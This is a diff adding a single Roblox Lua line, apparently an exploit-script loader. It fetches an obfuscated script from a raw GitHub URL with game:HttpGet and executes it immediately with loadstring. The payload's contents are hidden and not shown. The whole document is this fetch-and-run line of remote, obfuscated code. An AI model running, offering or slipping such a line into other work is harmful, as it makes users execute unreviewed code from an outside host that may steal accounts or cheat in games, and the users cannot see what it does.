@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/LlawlietScripts/243132/main/obf_AldYN7acXb1OI98GZSy6s3w3rhVd1rjgAS7elRT8PphIDg0AsdEsVgxkSOm57G7k.lua'))()
